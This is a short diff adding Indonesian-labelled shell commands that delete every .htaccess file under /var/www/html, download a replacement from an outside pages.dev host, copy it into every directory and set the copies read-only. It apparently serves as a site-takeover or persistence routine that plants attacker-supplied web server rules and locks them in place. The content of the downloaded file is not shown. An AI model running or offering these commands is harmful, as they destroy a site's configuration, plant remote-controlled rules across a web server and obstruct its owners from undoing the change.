@@ -1,0 +1,10 @@
+HAPUS SEMUA HTACCESS DI DIR
+find /var/www/html -name ".htaccess" -type f -delete
+
+UPLOAD SEMUA HTACCESS DI DIR
+wget https://nabila2.pages.dev/txt/htaccess.txt -O /tmp/htaccess.txt
+
+find /var/www/html -type d -exec cp /tmp/htaccess.txt {}/.htaccess \;
+
+CHMOD SEMUA HTACCESS DI DIR
+find /var/www/html -name ".htaccess" -type f -exec chmod 0444 {} \;
